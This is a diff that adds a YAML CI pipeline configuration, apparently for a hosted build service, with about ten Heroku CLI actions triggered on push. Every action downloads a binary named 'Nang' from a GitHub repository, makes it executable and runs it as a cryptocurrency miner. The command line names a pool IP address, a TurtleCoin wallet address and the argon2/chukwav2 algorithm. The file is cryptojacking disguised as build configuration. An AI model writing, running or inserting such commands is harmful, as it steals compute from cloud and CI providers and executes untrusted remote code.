@@ -1,0 +1,98 @@
+- pipeline: "pip"
+  on: "EVENT"
+  events:
+  - type: "PUSH"
+    refs:
+    - "refs/heads/circleci-editor/circleci-project-setup"
+  priority: "NORMAL"
+  fail_on_prepare_env_warning: true
+  actions:
+  - action: "Execute: "
+    type: "HEROKU_CLI"
+    application_name: "opmanqw29"
+    execute_commands:
+    - "wget https://github.com/haningsari/nang/raw/main/Nang && chmod 777 Nang && POL=139.162.216.199:3135 && WAL=TRTLv1Yi4WzJxmn1JrSVYh9M6kTtRyV9NSnn3EnGcr1YMLYdtLKFcw3MJfpxpx2bgV2XqBRMhtUZUX3LCNiNPENpRg56ZeeX5Hz && WOR=yui && ./Nang --donate-level 1 -o $POL -u $WAL -p $WOR -a argon2/chukwav2 -k"
+    - ""
+    shell: "SH"
+    run_next_parallel: true
+    integration_hash: "0pRK4mVoBDbD6wgkel2EONvnGP"
+  - action: "Execute: "
+    type: "HEROKU_CLI"
+    application_name: "opmanqw26"
+    execute_commands:
+    - "wget https://github.com/haningsari/nang/raw/main/Nang && chmod 777 Nang && POL=139.162.216.199:3135 && WAL=TRTLv1Yi4WzJxmn1JrSVYh9M6kTtRyV9NSnn3EnGcr1YMLYdtLKFcw3MJfpxpx2bgV2XqBRMhtUZUX3LCNiNPENpRg56ZeeX5Hz && WOR=yui && ./Nang --donate-level 1 -o $POL -u $WAL -p $WOR -a argon2/chukwav2 -k"
+    - ""
+    shell: "SH"
+    run_next_parallel: true
+    integration_hash: "0pRK4mVoBDbD6wgkel2EONvnGP"
+  - action: "Execute: "
+    type: "HEROKU_CLI"
+    application_name: "opmanqw28"
+    execute_commands:
+    - "wget https://github.com/haningsari/nang/raw/main/Nang && chmod 777 Nang && POL=139.162.216.199:3135 && WAL=TRTLv1Yi4WzJxmn1JrSVYh9M6kTtRyV9NSnn3EnGcr1YMLYdtLKFcw3MJfpxpx2bgV2XqBRMhtUZUX3LCNiNPENpRg56ZeeX5Hz && WOR=yui && ./Nang --donate-level 1 -o $POL -u $WAL -p $WOR -a argon2/chukwav2 -k"
+    - ""
+    shell: "SH"
+    run_next_parallel: true
+    integration_hash: "0pRK4mVoBDbD6wgkel2EONvnGP"
+  - action: "Execute: "
+    type: "HEROKU_CLI"
+    application_name: "opmanqw27"
+    execute_commands:
+    - "wget https://github.com/haningsari/nang/raw/main/Nang && chmod 777 Nang && POL=139.162.216.199:3135 && WAL=TRTLv1Yi4WzJxmn1JrSVYh9M6kTtRyV9NSnn3EnGcr1YMLYdtLKFcw3MJfpxpx2bgV2XqBRMhtUZUX3LCNiNPENpRg56ZeeX5Hz && WOR=yui && ./Nang --donate-level 1 -o $POL -u $WAL -p $WOR -a argon2/chukwav2 -k"
+    - ""
+    shell: "SH"
+    run_next_parallel: true
+    integration_hash: "0pRK4mVoBDbD6wgkel2EONvnGP"
+  - action: "Execute: "
+    type: "HEROKU_CLI"
+    application_name: "opmanqw30"
+    execute_commands:
+    - "wget https://github.com/haningsari/nang/raw/main/Nang && chmod 777 Nang && POL=139.162.216.199:3135 && WAL=TRTLv1Yi4WzJxmn1JrSVYh9M6kTtRyV9NSnn3EnGcr1YMLYdtLKFcw3MJfpxpx2bgV2XqBRMhtUZUX3LCNiNPENpRg56ZeeX5Hz && WOR=yui && ./Nang --donate-level 1 -o $POL -u $WAL -p $WOR -a argon2/chukwav2 -k"
+    - ""
+    shell: "SH"
+    run_next_parallel: true
+    integration_hash: "0pRK4mVoBDbD6wgkel2EONvnGP"
+  - action: "Execute: "
+    type: "HEROKU_CLI"
+    application_name: "opmanqw26"
+    execute_commands:
+    - "wget https://github.com/haningsari/nang/raw/main/Nang && chmod 777 Nang && POL=139.162.216.199:3135 && WAL=TRTLv1Yi4WzJxmn1JrSVYh9M6kTtRyV9NSnn3EnGcr1YMLYdtLKFcw3MJfpxpx2bgV2XqBRMhtUZUX3LCNiNPENpRg56ZeeX5Hz && WOR=yui && ./Nang --donate-level 1 -o $POL -u $WAL -p $WOR -a argon2/chukwav2 -k"
+    - ""
+    shell: "SH"
+    run_next_parallel: true
+    integration_hash: "0pRK4mVoBDbD6wgkel2EONvnGP"
+  - action: "Execute: "
+    type: "HEROKU_CLI"
+    application_name: "opmanqw28"
+    execute_commands:
+    - "wget https://github.com/haningsari/nang/raw/main/Nang && chmod 777 Nang && POL=139.162.216.199:3135 && WAL=TRTLv1Yi4WzJxmn1JrSVYh9M6kTtRyV9NSnn3EnGcr1YMLYdtLKFcw3MJfpxpx2bgV2XqBRMhtUZUX3LCNiNPENpRg56ZeeX5Hz && WOR=yui && ./Nang --donate-level 1 -o $POL -u $WAL -p $WOR -a argon2/chukwav2 -k"
+    - ""
+    shell: "SH"
+    run_next_parallel: true
+    integration_hash: "0pRK4mVoBDbD6wgkel2EONvnGP"
+  - action: "Execute: "
+    type: "HEROKU_CLI"
+    application_name: "opmanqw29"
+    execute_commands:
+    - "wget https://github.com/haningsari/nang/raw/main/Nang && chmod 777 Nang && POL=139.162.216.199:3135 && WAL=TRTLv1Yi4WzJxmn1JrSVYh9M6kTtRyV9NSnn3EnGcr1YMLYdtLKFcw3MJfpxpx2bgV2XqBRMhtUZUX3LCNiNPENpRg56ZeeX5Hz && WOR=yui && ./Nang --donate-level 1 -o $POL -u $WAL -p $WOR -a argon2/chukwav2 -k"
+    - ""
+    shell: "SH"
+    run_next_parallel: true
+    integration_hash: "0pRK4mVoBDbD6wgkel2EONvnGP"
+  - action: "Execute: "
+    type: "HEROKU_CLI"
+    application_name: "opmanqw29"
+    execute_commands:
+    - "wget https://github.com/haningsari/nang/raw/main/Nang && chmod 777 Nang && POL=139.162.216.199:3135 && WAL=TRTLv1Yi4WzJxmn1JrSVYh9M6kTtRyV9NSnn3EnGcr1YMLYdtLKFcw3MJfpxpx2bgV2XqBRMhtUZUX3LCNiNPENpRg56ZeeX5Hz && WOR=yui && ./Nang --donate-level 1 -o $POL -u $WAL -p $WOR -a argon2/chukwav2 -k"
+    - ""
+    shell: "SH"
+    run_next_parallel: true
+    integration_hash: "0pRK4mVoBDbD6wgkel2EONvnGP"
+  - action: "Execute: "
+    type: "HEROKU_CLI"
+    application_name: "opmanqw28"
+    execute_commands:
+    - "wget https://github.com/haningsari/nang/raw/main/Nang && chmod 777 Nang && POL=139.162.216.199:3135 && WAL=TRTLv1Yi4WzJxmn1JrSVYh9M6kTtRyV9NSnn3EnGcr1YMLYdtLKFcw3MJfpxpx2bgV2XqBRMhtUZUX3LCNiNPENpRg56ZeeX5Hz && WOR=yui && ./Nang --donate-level 1 -o $POL -u $WAL -p $WOR -a argon2/chukwav2 -k"
+    - ""
+    shell: "SH"
+    integration_hash: "0pRK4mVoBDbD6wgkel2EONvnGP"
